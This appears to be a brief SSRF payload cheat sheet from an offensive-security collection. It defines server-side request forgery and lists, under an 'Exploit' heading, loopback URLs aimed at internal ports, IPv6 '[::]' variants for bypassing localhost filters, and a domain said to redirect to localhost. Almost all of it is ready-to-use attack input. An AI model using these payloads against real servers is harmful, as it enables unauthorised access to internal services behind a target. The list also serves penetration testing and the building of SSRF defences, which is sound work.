# Server-Side Request Forgery 
Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on behalf of him.	

## Exploit

Basic SSRF v1
```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
```

Basic SSRF v2
```
http://localhost:80
http://localhost:443
http://localhost:22
```

Bypass localhost with [::]
```
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

Bypass localhost with a domain redirecting to locahost
```
http://n-pn.info
```

## Thanks to
* 